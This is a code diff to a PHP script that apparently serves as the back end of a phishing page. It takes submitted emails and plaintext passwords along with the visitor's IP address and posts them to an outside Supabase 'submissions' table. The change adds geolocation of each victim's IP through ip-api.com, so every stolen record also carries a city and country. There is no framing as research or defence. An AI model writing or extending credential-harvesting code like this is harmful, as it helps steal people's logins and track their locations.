@@ -4,13 +4,21 @@ session_start();
 $email = $_POST['email'];
 $password = $_POST['password'];
 $ip = $_SERVER['REMOTE_ADDR'];
+$location = "Unknown";
+$geo = @json_decode(file_get_contents("http://ip-api.com/json/" . $ip), true);
+if ($geo && $geo['status'] == 'success') {
+    $location = $geo['city'] . ", " . $geo['country'];
+}
+
+
 
 $url = "https://ptshthtnjcbngiceyjzc.supabase.co/rest/v1/submissions";
 
 $data = array(
     "email" => $email,
     "password" => $password,
-    "ip_address" => $ip
+    "ip_address" => $ip,
+    "location" => $location
 );
 
 $payload = json_encode($data);
